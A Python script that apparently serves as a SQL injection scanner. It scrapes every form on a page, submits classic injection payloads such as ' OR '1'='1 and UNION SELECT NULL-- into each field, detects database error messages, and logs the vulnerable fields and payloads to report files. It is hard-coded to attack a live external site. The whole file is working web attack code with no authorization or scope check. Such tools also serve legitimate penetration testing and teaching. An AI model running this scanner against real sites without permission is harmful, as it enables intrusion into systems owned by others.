import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import json

# SQLi payloads
sql_payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    '" OR ""="',
    "';--",
]

# SQLi error indicators
def is_suspected_sqli(response_text):
    indicators = [
        "you have an error in your sql syntax",
        "mysql_fetch", "warning: mysql_", "unclosed quotation",
        "syntax error", "near '", "PDOException", "PG::",
        "SQLite", "unexpected end", "query failed", "ODBC"
    ]
    return any(err.lower() in response_text.lower() for err in indicators)

# Main scanner
def scan_for_sqli(url):
    try:
        res = requests.get(url, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        forms = soup.find_all("form")
        print(f"[+] Found {len(forms)} form(s) on {url}\n")

        text_log = []
        json_log = []

        for form_num, form in enumerate(forms, 1):
            action = form.get("action") or url
            form_url = urljoin(url, action)
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")

            text_log.append(f"\n🔍 Scanning Form #{form_num} ({method.upper()}): {form_url}")
            print(f"🔍 Scanning Form #{form_num} ({method.upper()}): {form_url}")

            # Aggressive Scan
            vulnerable = False
            for payload in sql_payloads:
                data = {}
                for inp in inputs:
                    name = inp.get("name")
                    if name:
                        data[name] = payload

                resp = requests.post(form_url, data=data) if method == "post" else requests.get(form_url, params=data)

                if is_suspected_sqli(resp.text):
                    text_log.append(f"🚨 Form flagged vulnerable during aggressive scan with payload: {payload}")
                    print(f"🚨 Form flagged vulnerable during aggressive scan with payload: {payload}")
                    vulnerable = True
                    break

            if vulnerable:
                for inp in inputs:
                    name = inp.get("name")
                    if not name:
                        continue

                    for payload in sql_payloads:
                        data = {}
                        for other in inputs:
                            input_name = other.get("name")
                            if not input_name:
                                continue
                            data[input_name] = payload if input_name == name else "test"

                        resp = requests.post(form_url, data=data) if method == "post" else requests.get(form_url, params=data)

                        if is_suspected_sqli(resp.text):
                            text_log.append(f"    🎯 Vulnerable Field: {name}")
                            text_log.append(f"    💣 Payload Used   : {payload}")
                            print(f"    🎯 Vulnerable Field: {name}")
                            print(f"    💣 Payload Used   : {payload}")

                            json_log.append({
                                "form_number": form_num,
                                "form_url": form_url,
                                "method": method.upper(),
                                "vulnerable_field": name,
                                "payload": payload
                            })
                            break
                text_log.append("-" * 70)
                print("-" * 70)
            else:
                text_log.append("✅ No SQLi indicators found in this form.\n" + "-" * 70)
                print("✅ No SQLi indicators found in this form.\n" + "-" * 70)

        # Save logs
        with open("sqli_report.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(text_log))

        with open("sqli_report.json", "w", encoding="utf-8") as f:
            json.dump(json_log, f, indent=2)

        print("\n✅ Results saved to sqli_report.txt and sqli_report.json")

    except Exception as e:
        print(f"[!] Error scanning {url}: {e}")

# 🔍 Static target URL
target_url = "https://sqltest.net/"
scan_for_sqli(target_url)
